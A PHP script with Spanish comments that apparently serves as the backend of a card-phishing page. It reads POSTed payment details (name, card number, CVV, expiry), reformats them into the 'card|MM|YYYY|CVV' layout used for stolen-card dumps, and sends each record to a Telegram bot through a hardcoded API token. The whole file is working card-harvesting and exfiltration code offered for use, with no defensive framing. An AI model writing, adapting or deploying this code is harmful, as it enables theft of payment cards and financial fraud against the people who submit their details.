<?php
// Función para formatear la información del pago
function formatear_informacion($data) {
    // Dividir la información en líneas
    $lineas = explode("\n", $data);

    // Extraer la información
    $nombre = trim(explode(': ', $lineas[1])[1]);
    $numero_tarjeta = trim(explode(': ', $lineas[2])[1]);
    $cvv = trim(explode(': ', $lineas[3])[1]);
    $fecha_vencimiento = trim(explode(': ', $lineas[4])[1]);

    // Convertir la fecha de vencimiento de MMYY a MM|YYYY
    $mes_vencimiento = substr($fecha_vencimiento, 0, 2);
    $ano_vencimiento = '20' . substr($fecha_vencimiento, 2);

    // Formatear la información
    return "$numero_tarjeta|$mes_vencimiento|$ano_vencimiento|$cvv";
}

// Token del bot de Telegram
$apiToken = "7254220244:AAHb4kQ0IdVGRghwWnmIzNBZ7yDb4cZuiW4";

// Chat ID del bot de Telegram
$chatId = "@Omaticlogsbot";  // Asegúrate de que este es el chat ID correcto

// Verificar si se envió un POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener los datos enviados
    $mensaje = $_POST['mensaje'];

    try {
        // Formatear la información del pago
        $resultado = formatear_informacion($mensaje);

        // Preparar los datos para enviar a Telegram
        $data = [
            'chat_id' => $chatId,
            'text' => $resultado,
            'parse_mode' => 'HTML'
        ];

        // Enviar solicitud a la API de Telegram
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));

        if ($response === FALSE) {
            throw new Exception("Error enviando el mensaje.");
        }

        echo "Mensaje enviado con éxito.";
    } catch (Exception $e) {
        echo "Hubo un error procesando la información: " . $e->getMessage();
    }
} else {
    echo "No se recibieron datos.";
}
?>
